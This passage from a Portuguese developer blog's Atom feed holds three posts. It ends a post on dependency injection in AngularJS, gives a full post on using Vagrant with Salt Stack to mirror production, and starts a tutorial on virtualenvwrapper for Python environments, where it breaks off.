e &lt;a href="https://klauslaube.com.br/2011/08/02/decorators-em-python.html" title="Leia mais sobre Decorators"&gt;&lt;em&gt;Decorators&lt;/em&gt;&lt;/a&gt;,
o nome pode até causar certo calafrio... &lt;em&gt;Don't panic&lt;/em&gt;! Segundo a documentação da &lt;em&gt;AngularJS&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dependency Injection (DI) is a software design pattern that deals with how components
get hold of their dependencies.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ou seja, ao invés de permitir que o seu componente de &lt;em&gt;software&lt;/em&gt; manuseie dependências,
você explicitamente passará as dependências que ele necessita.&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Stackoverflow&lt;/em&gt; temos o
&lt;a href="http://stackoverflow.com/questions/130794/what-is-dependency-injection" title="What's dependency injection?"&gt;melhor exemplo da face da terra&lt;/a&gt;
para ilustrar uma injeção de dependência. Abaixo um código sem o &lt;em&gt;DI&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;SomeClass&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;myObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Factory&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getObject&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora, com &lt;em&gt;DI&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;SomeClass&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MyClass&lt;/span&gt; &lt;span class="n"&gt;myObject&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;myObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;myObject&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Simples, não?! As dependências do seu componente ficam explícitas, fáceis de gerenciar, e
seu código fica mais fácil de manter.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/dependency-injection-hulk.jpg" width="600" height="333" title="Injenções podem te dar super poderes... Ou não. (hanhchampion.blogspot.com.br)" alt="Injenções podem te dar super poderes... Ou não. (hanhchampion.blogspot.com.br)"&gt;&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;Angular&lt;/em&gt; utiliza esse conceito para que seja possível passar para o seu &lt;em&gt;controller&lt;/em&gt;,
uma série de &lt;em&gt;services&lt;/em&gt; necessários para a resolução de um problema:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;myApp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;angular&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;myApp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]);&lt;/span&gt;

&lt;span class="nx"&gt;myApp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;controller&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mainController&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$scope&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$log&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$scope&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$log&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="nx"&gt;$scope&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;$log&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$scope&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}]);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Imagine o trabalhão que seria em todo &lt;em&gt;controller&lt;/em&gt; ter que instanciar o
serviço de &lt;code&gt;$scope&lt;/code&gt; ou de &lt;code&gt;$log&lt;/code&gt;?&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Testar um código&lt;/strong&gt; que utiliza &lt;em&gt;Dependency Injection&lt;/em&gt; é &lt;strong&gt;muito mais fácil&lt;/strong&gt;, pois
&lt;a href="https://klauslaube.com.br/2015/06/29/os-testes-e-os-dubles-parte-2.html" title="Os testes e os dublês - Parte 2"&gt;&lt;em&gt;mockar&lt;/em&gt;&lt;/a&gt;
as dependências e garantir o comportamente esperado pode ser feito com muito menos linhas de código.&lt;/p&gt;
&lt;p&gt;Além disso, se o contrato de uma dependência mudar, com essa prática fica mais fácil de
alterar o seu código, fazendo com que a integração entre componentes seja mais &lt;em&gt;smooth&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Se você ainda duvida desse &lt;em&gt;design pattern&lt;/em&gt;, fica a constatação: É fácil
assegurar que a &lt;em&gt;AngularJS&lt;/em&gt; não seria o &lt;em&gt;framework&lt;/em&gt; que é hoje, sem o uso dessa prática.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="https://docs.angularjs.org/guide/di" title="Leia mais na documentação da Angular"&gt;AngularJS Developer Guide - Dependency Injection&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://stackoverflow.com/questions/130794/what-is-dependency-injection" title="Leia mais no Stackoverflow"&gt;Stackoverflow - What's dependency injection&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="design-patterns"></category><category term="dependency injection"></category><category term="angularjs"></category></entry><entry><title>Esse é mais um post sobre Vagrant</title><link href="https://klauslaube.com.br/2015/10/03/esse-e-mais-um-post-sobre-vagrant.html" rel="alternate"></link><published>2015-10-03T14:00:00-03:00</published><updated>2015-10-03T14:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2015-10-03:/2015/10/03/esse-e-mais-um-post-sobre-vagrant.html</id><summary type="html">&lt;p&gt;Sim! Esse é mais um &lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;Vagrant&lt;/em&gt;, entre tantos outros espalhados pela
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;. Sim! Se você já conhece a ferramenta,
provavelmente não terá nada de novo para você nesse artigo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Já falamos um pouco sobre &lt;a href="https://klauslaube.com.br/tag/virtualizacao.html" title="Leia mais sobre Virtualização"&gt;ambientes virtuais&lt;/a&gt;,
e as vantagens são numerosas. A "atomicidade" de poder construir e destruir …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sim! Esse é mais um &lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;Vagrant&lt;/em&gt;, entre tantos outros espalhados pela
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;. Sim! Se você já conhece a ferramenta,
provavelmente não terá nada de novo para você nesse artigo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Já falamos um pouco sobre &lt;a href="https://klauslaube.com.br/tag/virtualizacao.html" title="Leia mais sobre Virtualização"&gt;ambientes virtuais&lt;/a&gt;,
e as vantagens são numerosas. A "atomicidade" de poder construir e destruir um
ambiente inteiro, sem acarretar efeitos colaterais ao seu ambiente de trabalho,
traz agilidade sem perder segurança e sanidade.&lt;/p&gt;
&lt;p&gt;Sem dúvida o que levou "virtualização" de um &lt;em&gt;buzzword&lt;/em&gt; para uma necessidade
real na vida dos profissionais foi a diminuição do &lt;em&gt;overhead&lt;/em&gt; na criação de
ambientes virtuais. Hoje, uma porção de ferramentas é capaz de realizar essa
operação de maneira muito fácil.&lt;/p&gt;
&lt;p&gt;Entre essas ferramentas está o &lt;em&gt;Vagrant&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Quanto mais perto de produção, melhor&lt;/h2&gt;
&lt;p&gt;Por quê? Por que usar &lt;em&gt;Vagrant&lt;/em&gt;? Por que adicionar essa complexidade na minha
&lt;em&gt;stack&lt;/em&gt; de desenvolvimento?&lt;/p&gt;
&lt;p&gt;Quem utiliza &lt;a href="https://klauslaube.com.br/2011/03/07/diferentes-ambientes.html"&gt;mais de um ambiente&lt;/a&gt;
(como &lt;em&gt;dev&lt;/em&gt;, &lt;em&gt;qa&lt;/em&gt;, &lt;em&gt;staging&lt;/em&gt;, etc) defende que
eles servem como "peneiras" para pegarmos eventuais &lt;em&gt;bugs&lt;/em&gt; e problemas de
integração de código.&lt;/p&gt;
&lt;p&gt;Você já deve ter se deparado com o famoso problema "works on my machine":
Instalou aquela dependência que resolve a sua vida, mas quando sobe para algum
ambiente ela simplesmente não funciona.&lt;/p&gt;
&lt;p&gt;Ter um ambiente muito próximo de produção disponível para você em tempo de
desenvolvimento pode ser uma excelente ideia para economizar tempo, otimizar
processos, e lhe dar segurança para fazer aquela subida de código em plena
sexta-feira.&lt;/p&gt;
&lt;h2&gt;Vagrant FTW&lt;/h2&gt;
&lt;p&gt;Segundo o _&lt;a href="https://en.wikipedia.org/wiki/Vagrant_%28software%29" title="Leia sobre Vagrant"&gt;Wikipedia&lt;/a&gt;_:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Vagrant is computer software that creates and configures virtual development environments. It can be seen as a higher-level wrapper around virtualization software such as VirtualBox, VMware, KVM and Linux Containers (LXC), and around configuration management software such as Ansible, Chef, Salt, and Puppet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;É isso mesmo o que você leu! O &lt;em&gt;Vagrant&lt;/em&gt; é uma ferramenta que serve como uma
"cola" entre a sua máquina &lt;em&gt;VirtualBox&lt;/em&gt; e o seu provisionamento por &lt;em&gt;Puppet&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Nesse &lt;em&gt;blog&lt;/em&gt;, eu uso o &lt;em&gt;Vagrant&lt;/em&gt; para simular o meu ambiente de produção da
&lt;em&gt;Digital Ocean&lt;/em&gt;, composto por uma máquina &lt;em&gt;Ubuntu Linux&lt;/em&gt; com &lt;a href="https://klauslaube.com.br/tag/nginx.html" title="Leia mais sobre NGINX"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt;,
provisionada através de &lt;em&gt;Salt Stack&lt;/em&gt;. O meu &lt;code&gt;Vagrantfile&lt;/code&gt; ficou &lt;a href="https://raw.githubusercontent.com/kplaube/blog/master/Vagrantfile" title="Veja no GitHub"&gt;assim&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Vagrantfile API/syntax version. Don&amp;#39;t touch unless you know what you&amp;#39;re doing!&lt;/span&gt;
&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;

&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ubuntu1210-64&amp;quot;&lt;/span&gt;
  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;https://github.com/downloads/roderik/VagrantQuantal64Box/quantal64.box&amp;quot;&lt;/span&gt;

  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="ss"&gt;:forwarded_port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;guest&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;
  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;synced_folder&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;salt/roots/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/srv/salt/&amp;quot;&lt;/span&gt;

  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="ss"&gt;:salt&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;

    &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;minion_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;salt/minion&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_highstate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;
    &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;verbose&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;

  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Quer entender o que está acontecendo no exemplo acima? A documentação de &lt;a href="https://docs.vagrantup.com/v2/getting-started/index.html" title="Leia a documentação do Vagrant"&gt;&lt;em&gt;Getting started&lt;/em&gt; do &lt;em&gt;Vagrant&lt;/em&gt;&lt;/a&gt;
é uma excelente dica para começar. Engloba desde a instalação até o provisionamento.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/the-vagrant.jpg" width="600" height="400" title="Não é desse Vagrant que estamos falando... (deathsdoormatt.com)" alt="Não é desse Vagrant que estamos falando... (deathsdoormatt.com)"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;a href="http://saltstack.com/" title="Conheça o SaltStack"&gt;&lt;em&gt;Salt Stack&lt;/em&gt;&lt;/a&gt; é uma excelente
ferramenta de provisionamento escrita em &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. Vale muito a pena conhecer.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Além da vantagem de ter um ambiente próximo de produção disponível para você em
tempo de desenvolvimento, com o &lt;em&gt;Vagrant&lt;/em&gt; temos uma segunda vantagem: Quando um
novo integrante fazer parte do seu time, basta ele clonar o projeto e dar
um &lt;code&gt;vagrant up&lt;/code&gt;. Pronto! O ambiente levanta-se em uma máquina virtual, e é
provisionado sem necessidade de intervenção humana.&lt;/p&gt;
&lt;p&gt;Existem toneladas de artigos na &lt;em&gt;Web&lt;/em&gt; sobre o &lt;em&gt;Vagrant&lt;/em&gt;. O &lt;a href="http://simplesideias.com.br/usando-o-vagrant-como-ambiente-de-desenvolvimento-no-windows" title="Leia o artigo no SimplesIdeias"&gt;Usando o Vagrant como ambiente de desenvolvimento no Windows&lt;/a&gt;, do &lt;strong&gt;Simples Ideias&lt;/strong&gt; e &lt;a href="http://flaviosilveira.com/2012/vagrant-facil-e-util/" title="Leia no blog do Flavio"&gt;Vagrant: Fácil E útil&lt;/a&gt; do &lt;strong&gt;Flávio Silveira&lt;/strong&gt; são duas boas referências para quem está iniciando.&lt;/p&gt;
&lt;p&gt;Nos próximos &lt;em&gt;posts&lt;/em&gt; pretendo dar uma pincelada no &lt;em&gt;Salt Stack&lt;/em&gt; e &lt;em&gt;Ansible&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://saltstack.com/" title="Conheça o Salt Stack"&gt;SaltStack - Automation for CloudOps&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="https://www.vagrantup.com/" title="Conheça o Vagrant"&gt;Vagrant - Development environments made easy&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;_&lt;a href="https://en.wikipedia.org/wiki/Vagrant_%28software%29" title="Leia mais no Wikipedia"&gt;Wikipedia - Vagrant (software)&lt;/a&gt;_&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="infraestrutura"></category><category term="virtualizacao"></category><category term="provisionamento"></category><category term="vagrant"></category></entry><entry><title>Virtualenvwrapper: O básico para um bom ambiente de desenvolvimento Python</title><link href="https://klauslaube.com.br/2015/07/23/virtualenvwrapper-o-basico-para-um-bom-ambiente-de-desenvolvimento-python.html" rel="alternate"></link><published>2015-07-23T12:30:00-03:00</published><updated>2015-07-23T12:30:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2015-07-23:/2015/07/23/virtualenvwrapper-o-basico-para-um-bom-ambiente-de-desenvolvimento-python.html</id><summary type="html">&lt;p&gt;Já falamos sobre o &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;virtualenv&lt;/a&gt; há muito tempo atrás, aqui no &lt;em&gt;blog&lt;/em&gt;. Tirando alguns
detalhes técnicos, a bem da verdade é que de lá para cá, pouca coisa
mudou.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Apesar do seu uso ser completamente trivial, ter &lt;em&gt;virtualenvs&lt;/em&gt;
espalhados pelo seu disco rígido pode ser chato de gerenciar. Que
tal …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Já falamos sobre o &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;virtualenv&lt;/a&gt; há muito tempo atrás, aqui no &lt;em&gt;blog&lt;/em&gt;. Tirando alguns
detalhes técnicos, a bem da verdade é que de lá para cá, pouca coisa
mudou.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Apesar do seu uso ser completamente trivial, ter &lt;em&gt;virtualenvs&lt;/em&gt;
espalhados pelo seu disco rígido pode ser chato de gerenciar. Que
tal uma forma simples e centralizada de manipular os seus ambientes &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;?&lt;/p&gt;
&lt;p&gt;É aí que entra a
&lt;a href="https://virtualenvwrapper.readthedocs.org/en/latest/" title="Conheça a virtualenvwrapper"&gt;&lt;em&gt;virtualenvwrapper&lt;/em&gt;&lt;/a&gt;!&lt;/p&gt;
&lt;h2&gt;virtualenv + virtualenvwrapper == Win&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;virtualenvwrapper&lt;/em&gt;, como o seu nome sugere, é um &lt;em&gt;wrapper&lt;/em&gt; para o &lt;em&gt;virtualenv&lt;/em&gt;, adicionando algumas funcionalidades para facilitar a vida dos Pythonistas.&lt;/p&gt;
&lt;p&gt;Uma ferramenta simples, porém maravilhosa, que engloba as seguintes &lt;em&gt;features&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Organiza todos os seus ambientes virtuais em um único lugar.&lt;/li&gt;
&lt;li&gt;Adiciona funções de &lt;em&gt;create&lt;/em&gt;, &lt;em&gt;delete&lt;/em&gt; e &lt;em&gt;copy&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Troca de ambiente com um único comando.&lt;/li&gt;
&lt;li&gt;Permite a criação de &lt;em&gt;hooks&lt;/em&gt; para todas as suas operações.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Além disso, é uma ferramenta bem documentada! As instruções a seguir
são todas retiradas da própria &lt;a href="https://virtualenvwrapper.readthedocs.org/en/latest/"&gt;documentação&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/virtual-reality.jpg" width="600" height="405" title="Não confunda ambiente virtual com realidade virtual (oculus-news.com)" alt="Não confunda ambiente virtual com realidade virtual (oculus-news.com)"&gt;&lt;/p&gt;
&lt;h2&gt;Instalando&lt;/h2&gt;
&lt;p&gt;Para instalar o &lt;em&gt;virtualenvwrapper&lt;/em&gt;, o &lt;code&gt;pip&lt;/code&gt; é o caminho mais fácil:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install virtualenvwrapper
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se você estiver usando o &lt;em&gt;Bash&lt;/em&gt;, será necessário executar as seguintes instruções após a instalação (recomendável colocá-las em seu &lt;code&gt;~/.bash_profile&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;WORKON_HOME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/.virtualenvs
$ &lt;span class="nb"&gt;source&lt;/span&gt; /usr/local/bin/virtualenvwrapper.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Caso você utilize o &lt;a href="https://github.com/robbyrussell/oh-my-zsh" title="A delightful community-driven framework for managing your zsh configuration"&gt;&lt;em&gt;oh-my-zsh&lt;/em&gt;&lt;/a&gt;, basta adicionar o &lt;a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/plugins/virtualenvwrapper" title="Plugin do oh-my-zsh"&gt;&lt;em&gt;virtualenvwrapper&lt;/em&gt;&lt;/a&gt; ao seu &lt;code&gt;plugins&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A partir de agora, temos novos comandos disponíveis em nossa linha de comando.&lt;/p&gt;
&lt;h2&gt;Usando&lt;/h2&gt;
&lt;p&gt;Antes de mais nada, uma dica: Se você não quer mais cair no pecado de instalar
pacotes &lt;em&gt;Python&lt;/em&gt; em seu sistema operacional,
e permitir apenas instalação em &lt;em&gt;virtualenvs&lt;/em&gt;, basta exportar a seguinte variável de ambiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PIP_REQUIRE_VIRTUALENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! O &lt;code&gt;pip&lt;/code&gt; apenas continuará o procedimento de instalação de pacotes se você
estiver com o seu ambiente virtual ativo.&lt;/p&gt;
&lt;p&gt;Para criar um &lt;em&gt;virtualenv&lt;/em&gt;, utilizamos o comando &lt;code&gt;mkvirtualenv&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkvirtualenv teste
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Caso você queira criar um ambiente para uma versão de &lt;em&gt;Python&lt;/em&gt; diferente da &lt;em&gt;default&lt;/em&gt;
do seu sistema, basta especificar com o parâmetro &lt;code&gt;--python&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkvirtualenv teste_py3 --python&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/bin/python3.4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estamos com o ambiente ativo, isolado e totalmente limpo! Vamos instalar o
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;teste&lt;span class="o"&gt;)&lt;/span&gt; $ pip install django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E como sei que o meu pacote foi instalado em um ambiente isolado, e não no
&lt;code&gt;site-packages&lt;/code&gt; do meu sistema operacional? No caso do exemplo acima, podemos
garantir verificando o &lt;em&gt;path&lt;/em&gt; do executável &lt;code&gt;django-admin&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;teste&lt;span class="o"&gt;)&lt;/span&gt; $ which django-admin
/Users/&amp;lt;user&amp;gt;/.virtualenvs/teste/bin/django-admin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notem o &lt;code&gt;.virtualenvs/teste/&lt;/code&gt; no &lt;em&gt;path&lt;/em&gt;. Muito legal, não? Dessa forma, se eu tiver
um projeto que necessite do &lt;em&gt;Django 1.4&lt;/em&gt;, por exemplo, consigo instalá-lo sem
afetar os demais projetos na minha máquina.&lt;/p&gt;
&lt;p&gt;Para desativar o &lt;em&gt;environ&lt;/em&gt;, basta executar o comando &lt;code&gt;deactivate&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;teste&lt;span class="o"&gt;)&lt;/span&gt; $ deactivate
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E para trocar de ambiente virtual, usamos o comando &lt;code&gt;workon&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ workon teste
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Caso você queira ir para a pasta correspondente ao projeto,
sempre que realizar o &lt;code&gt;workon&lt;/code&gt;, basta utilizar o comando &lt;code&gt;setvirtualenvproject&lt;/code&gt;
no diretório escolhido:&lt;/p&gt;
